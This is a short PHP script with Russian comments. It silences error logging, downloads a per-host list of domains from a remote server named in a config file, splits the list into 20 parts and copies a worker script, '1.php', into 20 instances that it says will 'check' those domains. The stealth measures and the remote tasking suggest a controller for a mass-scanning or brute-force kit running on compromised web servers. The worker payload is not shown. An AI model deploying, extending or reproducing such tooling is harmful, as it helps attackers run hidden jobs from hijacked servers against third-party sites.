<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
function read_file($file_name) 	// $file_name - имя текст дока, который надо прочитать. $arr_name - имя массива, в который надо сохранить.
{
	$list = dirname(__FILE__)."/"."$file_name";
	if (file_exists("$file_name") and (filesize("$file_name")>1))
	{
		$file = fopen($list,"rt");
		$arr_file = explode("\n",fread($file,filesize($list)));
		fclose($file);
		return $arr_file;
	}
	else
	{
		$arr_file = array();
		return $arr_file;
	}
}

$client = $_SERVER['SERVER_NAME'];

$arr_server_name = read_file('server_name.txt');		// Формируем URL, по которому находится текст док с доменами.
$server_name = trim($arr_server_name[0]);
$server_name = "$server_name"."$client".".txt";

if (!copy($server_name, "domains.txt")) 
{
	$arch = file_get_contents($server_name);
	if (($arch !== "") and ($arch !== " ") and ($arch !== null))
	{
		$f = fopen ("domains.txt", "w");
		fwrite($f, $arch);
		fclose($f);
	}
	else
	{
		$ch = curl_init($server_name);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
						  
		$data = curl_exec($ch);
		curl_close($ch);
						  
		file_put_contents("domains.txt", $data);
	}
}

if (file_exists('domains.txt'))
{
	$arr_all_domains = read_file('domains.txt');
	
	$count_all_domains = count($arr_all_domains);		// Подсчитываем общее кол-во доменов для чека.
	$for_each = $count_all_domains/20;

	$arr_all_domains = array_chunk($arr_all_domains, $for_each);	// кол-во доменов на каждый поток.
		
	for ($c = 0; ($c < 20); $c++)						// Разбиваем текст. док с доменами на 20 равных частей.
	{
		$file_name = ($c+1);
		$file_name .= '.txt';
		$fnew = fopen("$file_name", "w");
		for ($o = 0; ($o <= $for_each); $o++)
		{
			fwrite($fnew, $arr_all_domains[$c][$o]);
			fwrite($fnew, "\n");
		}
		fclose($fnew);
	}
	
	$file = '1.php';									// Клонируем исполнительный скрипт в 20-ти экземплярах.
	for ($i = 2; ($i <= 20); $i++) 
	{
		$newfile = "$i.php";
		copy($file, $newfile);
	}
	echo "~Main script has been cloned!~";
}
else
{
	echo "ERROR!";
}
?>